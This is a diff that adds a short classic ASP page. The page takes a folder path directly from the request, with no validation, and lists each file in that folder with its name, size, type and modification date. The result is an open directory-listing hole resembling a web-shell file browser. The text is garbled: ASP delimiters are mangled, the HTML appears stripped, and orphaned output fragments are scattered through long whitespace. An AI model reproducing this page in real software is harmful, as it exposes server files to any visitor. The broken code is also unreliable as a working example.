@@ -1,0 +1,48 @@
+﻿: @ codepage = 65001 
+  
+set fso = server.createobject("scripting.filesystemobject")
+
+xpath = request("path")
+set fldr = fso.getfolder(xpath)
+
+
+
+
+
+
+
+
+
+
+
+                                                 =xpath
+
+
+
+
+               =xpath
+
+
+
+
+
+
+
+
+
+
+              
+              
+               for each sf in fldr.files
+               
+           
+
+                                                                      =sf.name
+                             =sf.name
+                                            =sf.size
+                              =sf.type
+                             =sf.datelastmodified
+
+                                  
+                                    next                                
+                                  
